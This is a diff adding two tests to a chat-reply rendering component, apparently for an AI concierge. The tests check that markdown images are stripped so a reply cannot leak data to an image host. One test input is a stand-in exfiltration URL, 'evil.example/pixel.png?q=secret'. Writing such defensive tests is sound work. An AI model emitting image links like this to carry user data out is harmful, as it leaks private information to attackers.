@@ -83,6 +83,23 @@ describe("ConciergeText", () => {
     expect(screen.queryByText(/```/)).toBeNull()
   })
 
+  it("never loads a markdown image, so a reply cannot send data to an image host", () => {
+    const leak = "https://evil.example/pixel.png?q=secret"
+    const { container } = render(<ConciergeText text={`Here ![Gyeongbokgung at dusk](${leak}) is.`} />)
+    expect(container.querySelector("img")).toBeNull()
+    expect(container.innerHTML).not.toContain("evil.example")
+    expect(screen.getByText(/Gyeongbokgung at dusk/)).toBeTruthy()
+  })
+
+  it("keeps a linked image's link but not its image", () => {
+    const { container } = render(
+      <ConciergeText text={"[![Mingles](https://evil.example/m.png)](https://mingles.example)"} />,
+    )
+    expect(container.querySelector("img")).toBeNull()
+    expect(container.innerHTML).not.toContain("evil.example")
+    expect(screen.getByRole("link", { name: "Mingles" }).getAttribute("href")).toBe("https://mingles.example")
+  })
+
   it("converts HTML emphasis Gemini sometimes emits", () => {
     render(<ConciergeText text={"<b>Mosu</b> is <i>quiet</i>"} />)
     expect(screen.getByText("Mosu").tagName).toBe("STRONG")
